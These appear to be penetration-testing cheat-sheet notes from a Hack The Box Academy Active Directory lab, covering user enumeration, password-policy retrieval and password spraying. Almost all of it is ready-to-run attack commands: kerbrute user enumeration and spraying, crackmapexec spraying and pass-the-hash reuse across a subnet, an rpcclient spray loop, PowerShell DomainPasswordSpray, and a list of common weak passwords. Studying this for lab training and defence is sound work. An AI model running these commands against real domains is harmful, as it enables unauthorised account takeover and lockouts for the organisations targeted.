##### **Hunting for Users**

```shell-session
[!bash!]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 192.168.110.55 jsmith.txt -o valid_ad_users

Orbixio@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

Orbixio@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

Orbixio@htb[/htb]$ crackmapexec smb 172.16.5.5 --users
Orbixio@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

Orbixio@htb[/htb]$ enum4linux -U 192.168.110.55  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
```
##### Password Policy

```shell-session
$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
rpcclient $> getdompwinfo
$ enum4linux-ng -P 172.16.5.5
$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

C:\htb> net accounts

PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```
#### Spraying (Finally)

> [!NOTE] Weak Creds
> `Passw0rd`,`Welcome1`,`Winter2022`,`Password123`

```shell-session
$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

$ sudo crackmapexec smb 172.16.5.5 -u users.txt -p Password123 | grep +
```

> [!NOTE] Validating User Account
> Validate accounts using `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`

> [!NOTE] Password Reuse
> `crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +`
> You can also try for password

```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
**Note:** If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.